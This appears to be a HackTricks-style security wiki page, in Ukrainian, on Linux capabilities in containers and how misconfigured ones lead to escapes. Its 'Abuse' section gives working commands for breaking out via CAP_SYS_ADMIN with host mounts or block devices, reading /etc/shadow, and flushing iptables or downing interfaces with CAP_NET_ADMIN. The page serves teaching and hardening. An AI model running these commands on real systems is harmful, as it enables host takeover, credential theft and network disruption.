# Linux Capabilities In Containers

{{#include ../../../../banners/hacktricks-training.md}}

## Огляд

Linux capabilities є одним із найважливіших елементів безпеки контейнерів, оскільки вони допомагають відповісти на тонке, але фундаментальне питання: **що насправді означає "root" усередині контейнера?** У звичайній Linux-системі UID 0 історично означав дуже широкий набір привілеїв. У сучасних ядрах ці привілеї розділені на менші одиниці, які називаються capabilities. Процес може працювати як root і водночас не мати багатьох потужних можливостей, якщо відповідні capabilities було видалено.

Контейнери значною мірою залежать від цього розмежування. Багато workload досі запускаються з UID 0 усередині контейнера з міркувань сумісності або простоти. Без drop capabilities це було б надто небезпечно. Якщо capabilities видалити, root-процес у контейнері все ще може виконувати багато звичайних завдань усередині контейнера, але йому буде заборонено виконувати більш чутливі операції з ядром. Саме тому shell контейнера, який показує `uid=0(root)`, не означає автоматично "host root" або навіть наявність широких привілеїв ядра. Набори capabilities визначають, наскільки цінною насправді є ця root-ідентичність.

Повний довідник із Linux capabilities і багато прикладів зловживання наведено тут:

{{#ref}}
../../../interesting-files-permissions/linux-capabilities.md
{{#endref}}

## Робота

Capabilities відстежуються в кількох наборах, зокрема permitted, effective, inheritable, ambient і bounding. Для багатьох оцінювань контейнерів точна семантика кожного набору ядра менш важлива, ніж практичне питання: **які привілейовані операції цей процес може успішно виконати прямо зараз і які майбутні підвищення привілеїв усе ще можливі?**

Це важливо, оскільки багато технік breakout насправді є проблемами capabilities, замаскованими під проблеми контейнерів. Workload із `CAP_SYS_ADMIN` отримує доступ до величезної кількості функцій ядра, яких звичайний root-процес контейнера не повинен торкатися. Workload із `CAP_NET_ADMIN` стає набагато небезпечнішим, якщо він також використовує host network namespace. Workload із `CAP_SYS_PTRACE` стає значно цікавішим, якщо він може бачити процеси хоста через спільний PID namespace хоста. У Docker або Podman це може мати вигляд `--pid=host`; у Kubernetes зазвичай використовується `hostPID: true`.

Іншими словами, набір capabilities не можна оцінювати ізольовано. Його потрібно розглядати разом із namespaces, seccomp і MAC policy.

## Лабораторна робота

Дуже простий спосіб перевірити capabilities усередині контейнера:
```bash
docker run --rm -it debian:stable-slim bash
apt-get update && apt-get install -y libcap2-bin
capsh --print
```
Також можна порівняти більш обмежений контейнер із контейнером, якому додано всі capabilities:
```bash
docker run --rm debian:stable-slim sh -c 'grep CapEff /proc/self/status'
docker run --rm --cap-add=ALL debian:stable-slim sh -c 'grep CapEff /proc/self/status'
```
Щоб побачити ефект вузького доповнення, спробуйте вилучити все й додати назад лише одну capability:
```bash
docker run --rm --cap-drop=ALL --cap-add=NET_BIND_SERVICE debian:stable-slim sh -c 'grep CapEff /proc/self/status'
```
Ці невеликі експерименти допомагають показати, що runtime не просто перемикає boolean під назвою "privileged". Він формує фактичну поверхню привілеїв, доступну процесу.

## High-Risk Capabilities

Хоча багато capabilities можуть мати значення залежно від цілі, кілька з них регулярно є важливими під час аналізу container escape.

**`CAP_SYS_ADMIN`** — це capability, до якої defenders мають ставитися з найбільшою підозрою. Її часто описують як "the new root", оскільки вона відкриває величезний обсяг функціональності, зокрема операції, пов’язані з mount, поведінку, чутливу до namespace, і багато kernel paths, які ніколи не слід бездумно відкривати для containers. Якщо container має `CAP_SYS_ADMIN`, weak seccomp і не має strong MAC confinement, багато classic breakout paths стають значно реалістичнішими.

**`CAP_SYS_PTRACE`** має значення, коли доступна visibility процесів, особливо якщо PID namespace спільний із host або з іншими цікавими workloads. Вона може перетворити visibility на tampering.

**`CAP_NET_ADMIN`** і **`CAP_NET_RAW`** мають значення в network-focused environments. В ізольованій bridge network вони вже можуть бути небезпечними; у shared host network namespace ситуація значно гірша, оскільки workload може отримати можливість переналаштовувати host networking, sniff, spoof або втручатися в local traffic flows.

**`CAP_SYS_MODULE`** зазвичай є катастрофічною в rootful environment, оскільки завантаження kernel modules фактично означає контроль над host kernel. Вона майже ніколи не має з’являтися в general-purpose container workload.

## Runtime Usage

Docker, Podman, stacks на базі containerd і CRI-O використовують capability controls, але defaults та management interfaces відрізняються. Docker безпосередньо надає їх через flags на кшталт `--cap-drop` і `--cap-add`. Podman надає подібні controls і часто додатково виграє від rootless execution як ще одного security layer. Kubernetes надає можливість додавати та видаляти capabilities через `securityContext` Pod або container. System-container environments, такі як LXC/Incus, також покладаються на capability control, але ширша інтеграція цих систем із host часто спонукає operators агресивніше послаблювати defaults, ніж вони робили б в app-container environment.

Той самий принцип діє в усіх цих системах: capability, яку технічно можливо надати, не обов’язково слід надавати. Багато real-world incidents починаються тоді, коли operator додає capability просто тому, що workload не запрацював у stricter configuration, а team потребувала quick fix.

## Misconfigurations

Найочевиднішою помилкою є **`--cap-add=ALL`** у CLIs на кшталт Docker/Podman, але це не єдина проблема. На практиці частіше трапляється надання однієї або двох надзвичайно потужних capabilities, особливо `CAP_SYS_ADMIN`, щоб "make the application work", без одночасного розуміння наслідків для namespace, seccomp і mount. Інший поширений failure mode — поєднання додаткових capabilities зі shared host namespace. У Docker або Podman це може мати вигляд `--pid=host`, `--network=host` або `--userns=host`; у Kubernetes аналогічна exposure зазвичай з’являється через workload settings, такі як `hostPID: true` або `hostNetwork: true`. Кожна з цих комбінацій змінює те, на що capability фактично може впливати.

Також часто можна побачити, як administrators вважають, що оскільки workload не є повністю `--privileged`, він усе ще має суттєві обмеження. Іноді це справді так, але іноді effective posture уже достатньо близька до privileged, тому ця відмінність перестає мати operational significance.

## Abuse

Перший practical step — enumeratе effective capability set і одразу перевірити capability-specific actions, які можуть мати значення для escape або доступу до host information:
```bash
capsh --print
grep '^Cap' /proc/self/status
```
Якщо присутня `CAP_SYS_ADMIN`, спочатку перевірте зловживання на основі mount і доступ до файлової системи хоста, оскільки це один із найпоширеніших чинників breakout:
```bash
mkdir -p /tmp/m
mount -t tmpfs tmpfs /tmp/m 2>/dev/null && echo "tmpfs mount works"
mount | head
find / -maxdepth 3 -name docker.sock -o -name containerd.sock -o -name crio.sock 2>/dev/null
```
Якщо присутній `CAP_SYS_PTRACE` і контейнер може бачити цікаві процеси, перевірте, чи можна використати цю capability для інспекції процесів:
```bash
capsh --print | grep cap_sys_ptrace
ps -ef | head
for p in 1 $(pgrep -n sshd 2>/dev/null); do cat /proc/$p/cmdline 2>/dev/null; echo; done
```
Якщо присутня `CAP_NET_ADMIN` або `CAP_NET_RAW`, перевірте, чи може workload маніпулювати видимим мережевим стеком або принаймні збирати корисні мережеві розвіддані:
```bash
capsh --print | grep -E 'cap_net_admin|cap_net_raw'
ip addr
ip route
iptables -S 2>/dev/null || nft list ruleset 2>/dev/null
```
Коли перевірка capability завершується успішно, враховуйте також ситуацію з namespace. Capability, яка в ізольованому namespace здається лише потенційно небезпечною, одразу може стати примітивом для escape або host-recon, якщо контейнер також спільно використовує host PID, host network або host mounts.

### Повний приклад: `CAP_SYS_ADMIN` + Host Mount = Host Escape

Якщо контейнер має `CAP_SYS_ADMIN` і writable bind mount файлової системи host, наприклад `/host`, шлях до escape часто є простим:
```bash
capsh --print | grep cap_sys_admin
mount | grep ' /host '
ls -la /host
chroot /host /bin/bash
```
Якщо `chroot` успішно виконується, команди тепер виконуються в контексті кореневої файлової системи хоста:
```bash
id
hostname
cat /etc/shadow | head
```
Якщо `chroot` недоступний, того самого результату часто можна досягти, викликавши бінарний файл через змонтоване дерево:
```bash
/host/bin/bash -p
export PATH=/host/usr/sbin:/host/usr/bin:/host/sbin:/host/bin:$PATH
```
### Повний приклад: `CAP_SYS_ADMIN` + доступ до пристроїв

Якщо блочний пристрій із host відкрито для доступу, `CAP_SYS_ADMIN` може перетворити його на прямий доступ до файлової системи host:
```bash
ls -l /dev/sd* /dev/vd* /dev/nvme* 2>/dev/null
mkdir -p /mnt/hostdisk
mount /dev/sda1 /mnt/hostdisk 2>/dev/null || mount /dev/vda1 /mnt/hostdisk 2>/dev/null
ls -la /mnt/hostdisk
chroot /mnt/hostdisk /bin/bash 2>/dev/null
```
### Повний приклад: `CAP_NET_ADMIN` + Host Networking

Ця комбінація не завжди безпосередньо надає права root на host, але може повністю переналаштувати мережевий стек host:
```bash
capsh --print | grep cap_net_admin
ip addr
ip route
iptables -S 2>/dev/null || nft list ruleset 2>/dev/null
ip link set lo down 2>/dev/null
iptables -F 2>/dev/null
```
Це може уможливити denial of service, перехоплення трафіку або доступ до сервісів, які раніше фільтрувалися.

## Перевірки

Мета перевірок capabilities полягає не лише у виведенні необроблених значень, а й у розумінні того, чи має процес достатньо привілеїв, щоб його поточний namespace і стан mount-ів становили небезпеку.
```bash
capsh --print                    # Human-readable capability sets and securebits
grep '^Cap' /proc/self/status    # Raw kernel capability bitmasks
```
Що тут важливо:

- `capsh --print` — найпростіший спосіб виявити capabilities із високим ризиком, як-от `cap_sys_admin`, `cap_sys_ptrace`, `cap_net_admin` або `cap_sys_module`.
- Рядок `CapEff` у `/proc/self/status` показує, які capabilities фактично ефективні зараз, а не лише те, що може бути доступним в інших наборах.
- Дамп capabilities стає значно важливішим, якщо контейнер також використовує спільні з host PID-, network- або user namespaces чи має writable mounts до host.

Після збору необробленої інформації про capabilities наступним кроком є її інтерпретація. З’ясуйте, чи є процес root, чи активні user namespaces, чи використовуються спільні host namespaces, чи застосовується seccomp і чи AppArmor або SELinux все ще обмежують процес. Сам по собі набір capabilities — лише частина картини, але часто саме він пояснює, чому один container breakout працює, а інший завершується невдачею за однакової початкової ситуації.

## Runtime Defaults

| Runtime / platform | Default state | Default behavior | Common manual weakening |
| --- | --- | --- | --- |
| Docker Engine | Reduced capability set by default | Docker зберігає default allowlist capabilities і видаляє решту | `--cap-add=<cap>`, `--cap-drop=<cap>`, `--cap-add=ALL`, `--privileged` |
| Podman | Reduced capability set by default | Podman containers за замовчуванням є unprivileged і використовують reduced capability model | `--cap-add=<cap>`, `--cap-drop=<cap>`, `--privileged` |
| Kubernetes | Inherits runtime defaults unless changed | Якщо `securityContext.capabilities` не задано, container отримує default capability set від runtime | `securityContext.capabilities.add`, failing to `drop: [\"ALL\"]`, `privileged: true` |
| containerd / CRI-O under Kubernetes | Usually runtime default | Effective set залежить від runtime і Pod spec | same as Kubernetes row; direct OCI/CRI configuration can also add capabilities explicitly |

Для Kubernetes важливо, що API не визначає один універсальний default capability set. Якщо Pod не додає і не видаляє capabilities, workload успадковує runtime default для відповідного node.
{{#include ../../../../banners/hacktricks-training.md}}
